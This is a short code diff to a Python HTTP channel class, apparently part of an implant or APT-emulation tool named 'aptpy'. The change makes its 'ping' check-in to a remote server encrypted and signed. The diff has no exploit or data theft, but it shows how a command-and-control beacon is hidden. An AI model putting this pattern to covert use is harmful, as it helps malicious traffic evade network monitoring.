@@ -2,6 +2,8 @@ import requests
 import sqlite3
 from abstract import AbstractChannel
 from logging import getLogger
+from json import dumps
+from lib.encrypt import encrypt, decrypt
 
 
 class HttpChannel(AbstractChannel):
@@ -19,10 +21,12 @@ class HttpChannel(AbstractChannel):
         getLogger('aptpy').debug("[HTTP] Trying to contact the remote server")
 
         try:
+            data = dumps({'task': 'ping', 'client_id': self.client_id})
+            encrypted = encrypt(data)
             cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}
 
             response = requests.post(self._remote_host,
-                                     json={'task': 'ping', 'client_id': self.client_id},
+                                     json=[encrypted['data'], encrypted['sign']],
                                      cookies=cookies
                                      )
 
